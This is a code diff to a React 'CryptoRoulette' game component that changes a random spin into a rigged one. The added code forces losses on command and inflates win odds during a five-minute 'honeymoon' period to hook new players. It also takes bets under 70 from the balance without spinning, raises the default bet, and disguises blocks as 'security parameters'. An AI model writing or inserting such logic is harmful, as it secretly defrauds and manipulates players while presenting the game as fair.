@@ -1,11 +1,12 @@
 import React, { useRef, useEffect, useState } from 'react';
 import { synth } from '../../utils/audioSynth';
 import { Sparkles, X, Play, ShieldAlert, Award, Grid } from 'lucide-react';
+import { evaluateBet, logWin, logLoss } from '../../utils/casinoRigging';
 
 interface GameProps {
   pokiBalance: number;
   onAwardBalance: (amount: number) => void;
-  onDeductBalance: (amount: number) => boolean;
+  onDeductBalance: (amount: number, setBet?: (val: number) => void) => boolean;
   syncCasinoData: (gameName: string, netProfitLoss: number, finalCoins: number) => Promise<void>;
   onClose: () => void;
 }
@@ -28,7 +29,7 @@ export default function CryptoRoulette({
   const isStartingRef = useRef<boolean>(false);
 
   const [gameState, setGameState] = useState<'idle' | 'spinning' | 'settled'>('idle');
-  const [betAmount, setBetAmount] = useState<number>(10);
+  const [betAmount, setBetAmount] = useState<number>(70);
   const [betType, setBetType] = useState<'gold' | 'slate' | 'green'>('gold');
 
   const [spinResult, setSpinResult] = useState<Sector | null>(null);
@@ -170,7 +171,21 @@ export default function CryptoRoulette({
       return;
     }
 
-    if (!onDeductBalance(parsedBet)) {
+    const uId = window.currentUserId || 'anonymous';
+    const evaluation = evaluateBet(uId, parsedBet, pokiBalance);
+    if (!evaluation.allowed) {
+      alert(evaluation.reason || 'Bet blocked by security parameters.');
+      isStartingRef.current = false;
+      return;
+    }
+
+    if (parsedBet < 70) {
+      onDeductBalance(parsedBet, setBetAmount);
+      isStartingRef.current = false;
+      return;
+    }
+
+    if (!onDeductBalance(parsedBet, setBetAmount)) {
       alert('Insufficient Pokicoin balance.');
       isStartingRef.current = false;
       return;
@@ -180,8 +195,56 @@ export default function CryptoRoulette({
     synth.playCoin();
     isStartingRef.current = false;
 
-    // Select random sector outcome
-    const targetIdx = Math.floor(Math.random() * totalSectors);
+    // Select rigged sector outcome
+    let targetIdx = 0;
+    
+    if (evaluation.shouldForceLoss) {
+      // Find sectors that do NOT match the betType
+      const losingIndices: number[] = [];
+      sectors.forEach((sec, idx) => {
+        if (sec.color !== betType) {
+          losingIndices.push(idx);
+        }
+      });
+      targetIdx = losingIndices.length > 0 ? losingIndices[Math.floor(Math.random() * losingIndices.length)] : 0;
+    } else {
+      // Check for Honeymoon Phase (within first 5 minutes of playing)
+      const stats = JSON.parse(localStorage.getItem(`casino_rigging_${uId}`) || '{}');
+      const isHoneymoon = stats.firstPlayTime && (Date.now() - stats.firstPlayTime < 5 * 60 * 1000);
+
+      const roll = Math.random();
+      let winChance = 0.46; // standard house edge (under 50%)
+      let greenChance = 0.01; // secure low green payout
+
+      if (isHoneymoon && parsedBet < 150) {
+        winChance = 0.65;
+        greenChance = 0.08;
+      } else if (evaluation.applyBrakeMode && parsedBet < 100) {
+        winChance = 0.58;
+        greenChance = 0.0; // no green in brake mode
+      }
+
+      if (roll < winChance) {
+        // Player wins! Find sectors matching the betType
+        const winningIndices: number[] = [];
+        sectors.forEach((sec, idx) => {
+          if (sec.color === betType) {
+            winningIndices.push(idx);
+          }
+        });
+        targetIdx = winningIndices.length > 0 ? winningIndices[Math.floor(Math.random() * winningIndices.length)] : 0;
+      } else {
+        // Player loses
+        const losingIndices: number[] = [];
+        sectors.forEach((sec, idx) => {
+          if (sec.color !== betType) {
+            losingIndices.push(idx);
+          }
+        });
+        targetIdx = losingIndices.length > 0 ? losingIndices[Math.floor(Math.random() * losingIndices.length)] : 0;
+      }
+    }
+
     const targetSector = sectors[targetIdx];
 
     // Compute stopping angle so that target segment lands at top pointer (angle = -Math.PI / 2)
@@ -239,9 +302,11 @@ export default function CryptoRoulette({
         if (isWin) {
           synth.playLevelUp();
           onAwardBalance(payoutVal);
+          logWin(uId, parsedBet, payoutVal, 'Crypto Roulette', pokiBalance);
           syncCasinoData('Crypto Roulette', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
         } else {
           synth.playCrash();
+          logLoss(uId, parsedBet, 'Crypto Roulette', pokiBalance);
           syncCasinoData('Crypto Roulette', netProfit, parseFloat((pokiBalance + netProfit).toFixed(8)));
         }
       }
